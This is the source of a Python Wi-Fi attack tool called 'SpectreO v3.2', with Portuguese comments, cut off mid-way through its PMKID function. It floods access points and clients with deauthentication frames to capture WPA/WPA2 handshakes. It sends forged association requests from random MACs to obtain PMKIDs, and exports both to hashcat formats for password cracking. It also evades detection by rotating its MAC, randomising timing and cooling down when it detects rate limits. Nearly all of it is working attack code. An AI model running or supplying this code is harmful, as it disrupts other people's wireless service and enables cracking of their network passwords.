#!/usr/bin/env python3
"""
SpectreO v3.2 - Production Hardened Edition (PMKID FIX)

NOVA correção v3.2:
✓ Validação RIGOROSA de PMKID (OUI + Type)
✓ Association Request completo com RSN
✓ Timeout aumentado (30s)
✓ Zero falsos positivos em PMKID
✓ Logs detalhados (OUI, Type, PMKID)

Todas as correções v3.1 mantidas:
✓ Sanitização completa
✓ Timeouts universais
✓ Cleanup handler (atexit + signal)
✓ Validação hostapd real
✓ Detecção PMF (802.11w)
✓ Auto-detect interface
✓ Logging dual
✓ Verificação MAC change
✓ Validação JSON
✓ Root check

Hardware: Aspire 3 15 (8GB RAM, 100GB disco)
Author: Cipher (Hardened by Security Team)
Version: 3.2
"""

import os
import sys
import time
import json
import gzip
import random
import subprocess
import threading
import re
import atexit
import signal
import logging
from scapy.all import *
from collections import defaultdict
from datetime import datetime

# Rich
try:
    from rich.console import Console
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    console = None

# ============================================================================
# CONFIG
# ============================================================================

CONFIG = {
    'interface': None,
    'output_dir': 'captures',
    'log_file': 'spectreo.log',
    'compress': True,
    'skip_captured': True,
    'optimize_live': True,
    'scan_duration': 30,
    'max_capture_attempts': 5,
    'capture_timeout': 30,
    'batch_mode': False,
    'batch_max_targets': 20,
    'batch_min_clients': 0,
    'batch_min_signal': -80,
    'batch_target_captures': None,
    'mac_rotation': True,
    'timing_randomization': True,
    'detect_countermeasures': True,
    'auto_export_hashcat': True,
    'aggressive_deauth': True,
    'verbose': True,
    'monitor_channel_changes': True,
    'ultra_verbose': True,
    'detect_pmf': True,
    'universal_timeout': 10,
    'pmkid_timeout': 30,  # NOVO: timeout específico para PMKID
    'pmkid_retries': 3     # NOVO: tentativas de captura PMKID
}

# ============================================================================
# CLEANUP HANDLER
# ============================================================================

class CleanupHandler:
    def __init__(self):
        self.processes = []
        self.interface = None
        self.original_mac = None
        self.cleaned = False
        
        atexit.register(self.cleanup)
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        self.cleanup()
        sys.exit(0)
    
    def register_process(self, proc):
        self.processes.append(proc)
    
    def set_interface(self, interface, original_mac=None):
        self.interface = interface
        self.original_mac = original_mac
    
    def cleanup(self):
        if self.cleaned:
            return
        
        self.cleaned = True
        print("\n[*] Limpando recursos...")
        
        for proc in self.processes:
            try:
                if proc.poll() is None:
                    proc.kill()
                    proc.wait(timeout=2)
            except:
                pass
        
        if self.interface:
            try:
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                              timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                if self.original_mac:
                    subprocess.run(['ip', 'link', 'set', self.interface, 'address', self.original_mac],
                                  timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                subprocess.run(['iw', self.interface, 'set', 'type', 'managed'],
                              timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                              timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                print(f"[+] Interface {self.interface} restaurada")
            except:
                pass
        
        try:
            subprocess.run(['systemctl', 'start', 'NetworkManager'],
                          timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] NetworkManager reiniciado")
        except:
            pass

cleanup_handler = CleanupHandler()

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=logging.DEBUG if CONFIG['verbose'] else logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(CONFIG['log_file']),
        logging.StreamHandler()
    ]
)

class ColoredLogger:
    @staticmethod
    def debug(msg):
        if CONFIG['verbose']:
            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
            if RICH_AVAILABLE:
                console.print(f"[dim cyan][DEBUG] {timestamp}[/dim cyan] [dim]{msg}[/dim]")
            else:
                print(f"[DEBUG] {timestamp} | {msg}")
            logging.debug(msg)
    
    @staticmethod
    def info(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[blue][INFO][/blue]  {timestamp} | {msg}")
        else:
            print(f"[INFO]  {timestamp} | {msg}")
        logging.info(msg)
    
    @staticmethod
    def success(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold green][+++][/bold green]   {timestamp} | {msg}")
        else:
            print(f"[+++]   {timestamp} | {msg}")
        logging.info(f"SUCCESS: {msg}")
    
    @staticmethod
    def warning(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold yellow][!][/bold yellow]     {timestamp} | {msg}")
        else:
            print(f"[!]     {timestamp} | {msg}")
        logging.warning(msg)
    
    @staticmethod
    def error(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold red][-][/bold red]     {timestamp} | {msg}")
        else:
            print(f"[-]     {timestamp} | {msg}")
        logging.error(msg)
    
    @staticmethod
    def progress(msg):
        if CONFIG['ultra_verbose']:
            timestamp = datetime.now().strftime('%H:%M:%S')
            if RICH_AVAILABLE:
                console.print(f"[magenta][>>][/magenta]    {timestamp} | {msg}")
            else:
                print(f"[>>]    {timestamp} | {msg}")
            logging.debug(f"PROGRESS: {msg}")

log = ColoredLogger()

# ============================================================================
# UTILS
# ============================================================================

def sanitize_filename(name):
    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', str(name))
    return safe_name[:50]

def require_root(func):
    def wrapper(*args, **kwargs):
        if os.geteuid() != 0:
            log.error(f"{func.__name__} requer root!")
            raise PermissionError("Root required")
        return func(*args, **kwargs)
    return wrapper

def detect_wireless_interface():
    log.info("Auto-detectando interface...")
    
    try:
        result = subprocess.run(['iw', 'dev'], 
                               capture_output=True, text=True, 
                               timeout=CONFIG['universal_timeout'])
        
        interfaces = re.findall(r'Interface (\w+)', result.stdout)
        
        for iface in interfaces:
            result = subprocess.run(['iw', iface, 'info'], 
                                   capture_output=True, text=True,
                                   timeout=CONFIG['universal_timeout'])
            
            if 'type monitor' in result.stdout.lower() or 'type managed' in result.stdout.lower():
                log.success(f"Interface: {iface}")
                return iface
        
        log.error("Nenhuma interface encontrada")
        return None
    
    except Exception as e:
        log.error(f"Erro: {e}")
        return None

def has_pmf(pkt):
    if not pkt.haslayer(Dot11Beacon):
        return False
    
    try:
        elt = pkt[Dot11Elt]
        while elt:
            if elt.ID == 48:
                info = bytes(elt.info)
                if len(info) >= 4:
                    capabilities = info[2] if len(info) > 2 else 0
                    if capabilities & 0xC0:
                        return True
            elt = elt.payload.getlayer(Dot11Elt)
    except:
        pass
    
    return False

# ============================================================================
# SAFE OPS
# ============================================================================

class SafeNetOps:
    @staticmethod
    def safe_sendp(packet, iface, **kwargs):
        try:
            sendp(packet, iface=iface, **kwargs)
            return True
        except OSError as e:
            if 'No such device' in str(e) or 'Network is down' in str(e):
                log.error(f"Interface {iface} offline!")
                return False
            else:
                log.error(f"Erro: {e}")
                return False
        except Exception as e:
            log.error(f"Erro: {e}")
            return False
    
    @staticmethod
    def check_interface_exists(interface):
        try:
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, stderr=subprocess.DEVNULL,
                                   timeout=CONFIG['universal_timeout'])
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def get_mac_address(interface):
        try:
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, text=True,
                                   timeout=CONFIG['universal_timeout'])
            
            match = re.search(r'link/ether ([0-9a-f:]{17})', result.stdout)
            if match:
                return match.group(1)
        except:
            pass
        return None

# ============================================================================
# CHANNEL MONITOR
# ============================================================================

class ChannelMonitor:
    def __init__(self, bssid, initial_channel, interface):
        self.bssid = bssid
        self.current_channel = initial_channel
        self.interface = interface
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
    
    def start(self):
        self.thread = threading.Thread(target=self._monitor, daemon=True)
        self.thread.start()
        log.debug(f"Channel monitor: {self.bssid}")
    
    def stop(self):
        self.stop_event.set()
        if hasattr(self, 'thread'):
            self.thread.join(timeout=2)
    
    def get_channel(self):
        with self.lock:
            return self.current_channel
    
    def _monitor(self):
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon) and pkt[Dot11].addr2 == self.bssid:
                try:
                    channel = int(ord(pkt[Dot11Elt:3].info))
                    with self.lock:
                        if channel != self.current_channel:
                            log.warning(f"AP mudou canal {self.current_channel} → {channel}")
                            self.current_channel = channel
                except:
                    pass
        
        sniff(iface=self.interface, prn=handler, timeout=60, 
              stop_filter=lambda x: self.stop_event.is_set(), store=False)

# ============================================================================
# CAPTURE STATE
# ============================================================================

class CaptureState:
    def __init__(self):
        self.packets = []
        self.captured = False
        self.lock = threading.Lock()
    
    def add_packet(self, pkt):
        with self.lock:
            self.packets.append(pkt)
    
    def get_packets(self):
        with self.lock:
            return self.packets.copy()
    
    def set_captured(self, value):
        with self.lock:
            self.captured = value
    
    def is_captured(self):
        with self.lock:
            return self.captured
    
    def packet_count(self):
        with self.lock:
            return len(self.packets)

# ============================================================================
# MANAGER
# ============================================================================

class CaptureManager:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.cap_dir = os.path.join(output_dir, 'cap_files')
        self.hashcat_dir = os.path.join(output_dir, 'hashcat_files')
        self.metadata_file = os.path.join(output_dir, 'captures.json')
        self.captured = self.load_metadata()
        
        os.makedirs(self.cap_dir, exist_ok=True)
        os.makedirs(self.hashcat_dir, exist_ok=True)
        
        log.info(f"Estrutura: {output_dir}/")
    
    def load_metadata(self):
        if not os.path.exists(self.metadata_file):
            return {}
        
        try:
            with open(self.metadata_file, 'r') as f:
                data = json.load(f)
                
                if not isinstance(data, dict):
                    log.warning("Metadata inválido")
                    return {}
                
                valid_data = {}
                for bssid, info in data.items():
                    required = ['ssid', 'attack_type', 'timestamp']
                    if all(k in info for k in required):
                        valid_data[bssid] = info
                    else:
                        log.warning(f"Metadata incompleto: {bssid}")
                
                log.debug(f"Metadata: {len(valid_data)} capturas")
                return valid_data
        
        except json.JSONDecodeError:
            log.error("Metadata corrompido")
            return {}
        except Exception as e:
            log.error(f"Erro metadata: {e}")
            return {}
    
    def save_metadata(self):
        try:
            with open(self.metadata_file, 'w') as f:
                json.dump(self.captured, f, indent=2, sort_keys=True)
        except Exception as e:
            log.error(f"Erro salvar: {e}")
    
    def is_captured(self, bssid):
        return bssid in self.captured
    
    def add_capture(self, bssid, ssid, attack_type, cap_file, hc_file, channel, signal, validation=None):
        self.captured[bssid] = {
            'ssid': ssid,
            'attack_type': attack_type,
            'cap_file': cap_file,
            'hashcat_file': hc_file,
            'channel': channel,
            'signal': signal,
            'timestamp': datetime.now().isoformat(),
            'validation': validation if validation else {}
        }
        self.save_metadata()

# ============================================================================
# VALIDATOR (PMKID RIGOROSO v3.2)
# ============================================================================

class CaptureValidator:
    @staticmethod
    def validate_handshake(packets):
        log.progress(f"Validando handshake: {len(packets)} pkts")
        eapol_frames = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        log.progress(f"EAPOL frames: {len(eapol_frames)}")
        
        if len(eapol_frames) < 4:
            log.warning(f"Incompleto: {len(eapol_frames)}/4")
            return False, f"Apenas {len(eapol_frames)}/4"
        
        has_msg1 = has_msg2 = False
        anonce = snonce = mic = None
        
        for i, pkt in enumerate(eapol_frames, 1):
            try:
                raw = bytes(pkt[EAPOL])
                if len(raw) < 99:
                    log.progress(f"Frame {i}: curto ({len(raw)}b)")
                    continue
                
                current_anonce = raw[17:49]
                current_snonce = raw[49:81] if len(raw) > 81 else None
                current_mic = raw[81:97] if len(raw) > 96 else None
                
                if current_anonce != b'\x00' * 32 and (not current_snonce or current_snonce == b'\x00' * 32):
                    has_msg1 = True
                    anonce = current_anonce
                    log.progress(f"Frame {i}: Msg1 (ANonce)")
                
                if current_snonce and current_snonce != b'\x00' * 32 and current_mic:
                    has_msg2 = True
                    snonce = current_snonce
                    mic = current_mic
                    log.progress(f"Frame {i}: Msg2 (SNonce+MIC)")
            except Exception as e:
                log.debug(f"Erro frame {i}: {e}")
                continue
        
        if not (has_msg1 and has_msg2):
            log.warning("INVÁLIDO: messages ausentes")
            return False, "Messages ausentes"
        if not anonce or anonce == b'\x00' * 32:
            return False, "ANonce inválido"
        if not snonce or snonce == b'\x00' * 32:
            return False, "SNonce inválido"
        if not mic or mic == b'\x00' * 16:
            return False, "MIC inválido"
        
        log.success("Handshake VÁLIDO!")
        return True, {
            'anonce': anonce.hex()[:32],
            'snonce': snonce.hex()[:32],
            'mic': mic.hex()[:32],
            'frames': len(eapol_frames)
        }
    
    @staticmethod
    def validate_pmkid(packets):
        """
        VALIDAÇÃO RIGOROSA DE PMKID (v3.2)
        Valida OUI (00:0F:AC) + Type (0x04)
        Zero falsos positivos
        """
        log.progress(f"Validando PMKID RIGOROSO: {len(packets)} pkts")
        
        for i, pkt in enumerate(packets, 1):
            if pkt.haslayer(EAPOL):
                try:
                    raw = bytes(pkt[EAPOL])
                    
                    # Busca Vendor Specific Elements (0xdd)
                    idx = 0
                    while idx < len(raw) - 22:
                        if raw[idx] == 0xdd:  # Vendor Specific tag
                            length = raw[idx + 1]
                            
                            if length >= 20:  # OUI(3) + Type(1) + PMKID(16) = 20 bytes mínimo
                                oui = raw[idx+2:idx+5]
                                data_type = raw[idx+5] if idx+5 < len(raw) else 0
                                
                                # Valida Wi-Fi Alliance OUI (00:0F:AC) + PMKID Type (0x04)
                                if oui == b'\x00\x0f\xac' and data_type == 0x04:
                                    pmkid = raw[idx+6:idx+22]  # 16 bytes PMKID
                                    
                                    if pmkid != b'\x00' * 16:
                                        log.success(f"✓ PMKID VÁLIDO (pkt {i})")
                                        log.debug(f"  OUI: {oui.hex()} (Wi-Fi Alliance)")
                                        log.debug(f"  Type: 0x{data_type:02x} (PMKID KDE)")
                                        log.debug(f"  PMKID: {pmkid.hex()}")
                                        
                                        return True, {
                                            'pmkid': pmkid.hex(),
                                            'oui': oui.hex(),
                                            'type': data_type,
                                            'packet_num': i
                                        }
                            
                            idx += 2 + length
                        else:
                            idx += 1
                
                except Exception as e:
                    log.debug(f"Erro pkt {i}: {e}")
                    continue
        
        log.warning("PMKID NÃO encontrado (AP pode não suportar)")
        return False, "Não encontrado"

# ============================================================================
# DETECTOR
# ============================================================================

class CountermeasureDetector:
    def __init__(self):
        self.deauth_times = []
        self.blocked = False
    
    def record_deauth(self):
        self.deauth_times.append(time.time())
        cutoff = time.time() - 60
        self.deauth_times = [t for t in self.deauth_times if t > cutoff]
        log.progress(f"Deauths 60s: {len(self.deauth_times)}")
    
    def check_rate_limit(self):
        if len(self.deauth_times) > 150:
            log.warning("RATE LIMITING!")
            self.blocked = True
            return True
        return False
    
    def reset(self):
        self.deauth_times = []
        self.blocked = False

# ============================================================================
# UTILS FUNCTIONS
# ============================================================================

def export_to_hashcat(cap_file, attack_type, manager):
    if not CONFIG['auto_export_hashcat']:
        return None
    
    log.progress(f"Export hashcat: {attack_type}")
    
    try:
        basename = os.path.basename(cap_file).replace('.cap.gz', '').replace('.cap', '')
        
        if attack_type == 'handshake':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc22000")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, timeout=CONFIG['universal_timeout'])
            if result.returncode == 0 and os.path.exists(output):
                log.success(f"Hashcat: {output}")
                return output
        
        elif attack_type == 'pmkid':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc16800")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, timeout=CONFIG['universal_timeout'])
            if result.returncode == 0 and os.path.exists(output):
                log.success(f"Hashcat: {output}")
                return output
    
    except FileNotFoundError:
        log.warning("hcxpcapngtool não encontrado")
    except subprocess.TimeoutExpired:
        log.warning("hcxpcapngtool timeout")
    except:
        pass
    
    return None

@require_root
def rotate_mac(interface):
    if not CONFIG['mac_rotation']:
        return None
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    log.progress(f"Rotacionando MAC: {new_mac}")
    
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                      check=True, timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                      check=True, timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                      check=True, timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        actual_mac = SafeNetOps.get_mac_address(interface)
        if actual_mac and actual_mac.lower() == new_mac.lower():
            log.info(f"MAC: {new_mac}")
            return new_mac
        else:
            log.warning(f"Driver não suportou (atual: {actual_mac})")
            return None
    
    except Exception as e:
        log.error(f"Falha MAC: {e}")
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          timeout=CONFIG['universal_timeout'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        return None

def optimize_system():
    if not CONFIG['optimize_live']:
        return
    
    log.info("Otimizando...")
    subprocess.run(['sysctl', '-w', 'vm.swappiness=0'], 
                  timeout=CONFIG['universal_timeout'],
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sync'], 
                  timeout=CONFIG['universal_timeout'],
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for svc in ['NetworkManager', 'wpa_supplicant']:
        subprocess.run(['systemctl', 'stop', svc], 
                      timeout=CONFIG['universal_timeout'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        os.nice(-20)
    except:
        pass
    
    log.success("Otimizado")

@require_root
def setup_interface(interface):
    log.info(f"Setup {interface}...")
    
    original_mac = SafeNetOps.get_mac_address(interface)
    cleanup_handler.set_interface(interface, original_mac)
    
    log.progress("airmon-ng check kill...")
    subprocess.run(['airmon-ng', 'check', 'kill'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    log.progress(f"MAC: {new_mac}")
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    log.progress("Modo monitor...")
    subprocess.run(['iw', interface, 'set', 'monitor', 'control'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'txpower', 'fixed', '30'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'power_save', 'off'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    log.success(f"Interface OK (MAC: {new_mac})")

def set_channel(interface, channel):
    log.progress(f"Canal {channel}")
    subprocess.run(['iw', interface, 'set', 'channel', str(channel)], 
                   timeout=CONFIG['universal_timeout'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan(interface, duration=30):
    networks = {}
    clients = defaultdict(list)
    traffic = defaultdict(int)
    pmf_detected = set()
    
    log.info(f"Scan ({duration}s)...")
    
    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                channel = int(ord(pkt[Dot11Elt:3].info))
                stats = pkt[Dot11Beacon].network_stats()
                crypto = stats.get('crypto', set())
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                
                if bssid not in networks:
                    networks[bssid] = {
                        'ssid': ssid if ssid else '<HIDDEN>',
                        'channel': channel,
                        'signal': signal,
                        'crypto': crypto
                    }
                    log.progress(f"AP: {ssid} Ch{channel}")
                    
                    if CONFIG['detect_pmf'] and has_pmf(pkt):
                        pmf_detected.add(bssid)
                        log.warning(f"PMF: {ssid}")
            except:
                pass
        
        elif pkt.haslayer(Dot11) and pkt.type == 2:
            for bssid in list(networks.keys()):
                if pkt.addr1 == bssid or pkt.addr2 == bssid:
                    client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                    if client != bssid and client not in clients[bssid]:
                        clients[bssid].append(client)
                        log.progress(f"Cliente: {client} -> {networks[bssid]['ssid']}")
                    traffic[bssid] += 1
    
    stop = threading.Event()
    
    def hop():
        channels = list(range(1, 14))
        while not stop.is_set():
            for ch in channels:
                if stop.is_set():
                    break
                set_channel(interface, ch)
                time.sleep(0.15)
    
    hopper = threading.Thread(target=hop, daemon=True)
    hopper.start()
    
    sniff(iface=interface, prn=handler, timeout=duration, store=False)
    
    stop.set()
    hopper.join()
    
    for bssid in networks:
        networks[bssid]['clients'] = clients.get(bssid, [])
        networks[bssid]['traffic'] = traffic.get(bssid, 0)
        networks[bssid]['pmf'] = bssid in pmf_detected
    
    log.success(f"Scan: {len(networks)} redes ({len(pmf_detected)} com PMF)")
    return networks

def wait_for_hostapd(proc, interface, ssid, timeout=10):
    log.progress("Aguardando hostapd...")
    start = time.time()
    
    while time.time() - start < timeout:
        if proc.poll() is not None:
            log.error("Hostapd morreu")
            return False
        
        try:
            result = subprocess.run(['iw', 'dev', interface, 'info'], 
                                   capture_output=True, text=True,
                                   timeout=2)
            
            if 'type AP' in result.stdout and ssid in result.stdout:
                log.success("Hostapd ativo!")
                return True
        except:
            pass
        
        time.sleep(0.5)
    
    log.error(f"Hostapd timeout ({timeout}s)")
    return False

# ============================================================================
# ATAQUES COMPLETOS (COM PMKID v3.2 CORRIGIDO)
# ============================================================================

def attack_handshake(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 1: Handshake WPA/WPA2")
    log.info("="*70)
    log.info(f"Alvo: {target['ssid']} ({target['bssid']})")
    log.info(f"Canal: {target['channel']} | Clientes: {len(target['clients'])} | Sinal: {target['signal']}dBm")
    
    if target.get('pmf'):
        log.warning("⚠️  AP tem PMF (802.11w) - deauth pode não funcionar")
        log.info("Continuando tentativa, mas PMKID pode ser melhor opção...")
    
    if not SafeNetOps.check_interface_exists(interface):
        log.error(f"Interface {interface} não existe!")
        return False
    
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(1)
    
    set_channel(interface, target['channel'])
    log.progress("Estabilizando canal...")
    time.sleep(1)
    
    channel_monitor = None
    if CONFIG['monitor_channel_changes']:
        channel_monitor = ChannelMonitor(target['bssid'], target['channel'], interface)
        channel_monitor.start()
    
    for attempt in range(1, CONFIG['max_capture_attempts'] + 1):
        log.info(f"\n{'~'*70}")
        log.info(f"TENTATIVA {attempt}/{CONFIG['max_capture_attempts']}")
        log.info(f"{'~'*70}")
        
        if CONFIG['detect_countermeasures'] and detector.check_rate_limit():
            log.warning("Rate limiting! Cooldown 60s...")
            time.sleep(60)
            rotate_mac(interface)
            detector.reset()
        
        state = CaptureState()
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    state.add_packet(pkt)
                    count = state.packet_count()
                    log.success(f"[EAPOL] Frame {count}/4 capturado!")
                    
                    if count >= 4:
                        log.progress("Validando 4-way handshake...")
                        valid, result = CaptureValidator.validate_handshake(state.get_packets())
                        if valid:
                            log.success("✓ HANDSHAKE VÁLIDO!")
                            state.set_captured(True)
                            return True
                        else:
                            log.warning(f"✗ Inválido: {result}")
                            log.info("Continuando captura...")
        
        done = threading.Event()
        
        def sniff_thread():
            log.progress(f"Sniffer ativo (timeout: {CONFIG['capture_timeout']}s)")
            sniff(iface=interface, prn=handler, timeout=CONFIG['capture_timeout'], 
                  stop_filter=lambda x: state.is_captured(), store=False)
            done.set()
            log.progress("Sniffer finalizado")
        
        sniffer = threading.Thread(target=sniff_thread, daemon=True)
        sniffer.start()
        
        time.sleep(1)
        
        inter = random.uniform(0.03, 0.10) if CONFIG['timing_randomization'] else 0.05
        rounds = 7 if CONFIG['aggressive_deauth'] else 3
        count = 40 if CONFIG['aggressive_deauth'] else 20
        
        log.info(f"Deauth: {count} pkts × {rounds} rodadas (intervalo {inter:.3f}s)")
        
        for round_num in range(1, rounds + 1):
            log.progress(f"[DEAUTH] Rodada {round_num}/{rounds} - {count} pacotes")
            
            if channel_monitor:
                current_ch = channel_monitor.get_channel()
                if current_ch != target['channel']:
                    log.warning(f"AP mudou canal → {current_ch}, ajustando...")
                    set_channel(interface, current_ch)
                    target['channel'] = current_ch
            
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            
            if not SafeNetOps.safe_sendp(frame, interface, count=count, inter=inter, verbose=0):
                log.error("Falha envio - interface offline?")
                break
            
            detector.record_deauth()
            log.progress(f"Broadcast deauth concluído")
            
            if target['clients']:
                num_clients = len(target['clients'][:5])
                log.progress(f"Deauth direcionado: {num_clients} clientes")
                for i, client in enumerate(target['clients'][:5], 1):
                    f1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    f2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    SafeNetOps.safe_sendp([f1, f2], interface, count=count//2, inter=inter, verbose=0)
                    detector.record_deauth()
                    log.progress(f"Cliente {i}/{num_clients}: {client}")
            
            delay = random.uniform(0.2, 0.5) if CONFIG['timing_randomization'] else 0.3
            time.sleep(delay)
        
        log.progress("Aguardando conclusão sniffer...")
        done.wait()
        
        if state.is_captured():
            log.success("Handshake capturado!")
            valid, result = CaptureValidator.validate_handshake(state.get_packets())
            
            if valid:
                filename_base = f"hs_{sanitize_filename(target['bssid'])}_{sanitize_filename(target['ssid'])}"
                
                log.progress("Salvando captura...")
                if CONFIG['compress']:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap.gz")
                    with gzip.open(cap_file, 'wb') as f:
                        wrpcap(f, state.get_packets())
                else:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
                    wrpcap(cap_file, state.get_packets())
                
                log.success(f"Arquivo: {cap_file}")
                
                hc_file = export_to_hashcat(cap_file, 'handshake', manager)
                manager.add_capture(target['bssid'], target['ssid'], 'handshake',
                                   cap_file, hc_file, target['channel'], target['signal'], result)
                
                log.success("="*70)
                log.success("HANDSHAKE CAPTURADO E VALIDADO!")
                log.success("="*70)
                log.info(f"ANonce: {result['anonce']}...")
                log.info(f"SNonce: {result['snonce']}...")
                log.info(f"MIC: {result['mic']}...")
                if hc_file:
                    log.info(f"Hashcat: {hc_file}")
                
                if channel_monitor:
                    channel_monitor.stop()
                
                return True
        else:
            log.warning(f"Tentativa {attempt} falhou")
        
        if attempt < CONFIG['max_capture_attempts']:
            log.info("Aguardando 3s...")
            time.sleep(3)
    
    if channel_monitor:
        channel_monitor.stop()
    
    log.error("="*70)
    log.error(f"FALHA após {CONFIG['max_capture_attempts']} tentativas")
    log.error("="*70)
    return False

def attack_pmkid(target, interface, manager, detector):
    """
    ATAQUE PMKID v3.2 - COM VALIDAÇÃO RIGOROSA
    - Association Request completo com RSN
    - Timeout aumentado para 30s
    - Retry com múltiplas tentativas
    - Validação OUI + Type
    """
    log.info("="*70)
    log.info("ATAQUE 2: PMKID (RSN PMKID v3.2)")
    log.info("="*70)
    log.info(f"Alvo: {target['ssid']} ({target['bssid']})")
    
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(1)
    
    set_channel(interface, target['channel'])
    log.progress("Estabilizando...")
    time.sleep(1)
    
    for attempt in range(1, CONFIG['pmkid_retries'] + 1):
        log.info(f"\n{'~'*70}")
        log.info(f"TENTATIVA PMKID {attempt}/{CONFIG['pmkid_retries']}")
        log.info(f"{'~'*70}")
        
        pmkid_packets = []
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    pmkid_packets.append(pkt)
                    log.progress(f"EAPOL recebido (total: {len(pmkid_packets)})")
        
        fake_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
        log.progress(f"MAC fake: {fake_mac}")
        
        log.progress("Enviando Association Request COMPLETO (com RSN)...")
        
        # Association Request COMPLETO v3.2
        for i in range(5):
            try:
                assoc = RadioTap()/\
                        Dot11(addr1=target['bssid'], addr2=fake_mac, addr3=target['bssid'])/\
                        Dot11AssoReq(cap='ESS+privacy', listen_interval=10)/\
                        Dot11Elt(ID='SSID', info=target['ssid'].encode() if target['ssid'] else b'')/\
                        Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')/\
                        Dot11Elt(ID='ExtRates', info=b'\x30\x48\x60\x6c')/\
                        Dot11Elt(ID='RSN', info=(
                            b'\x01\x00'              # Version
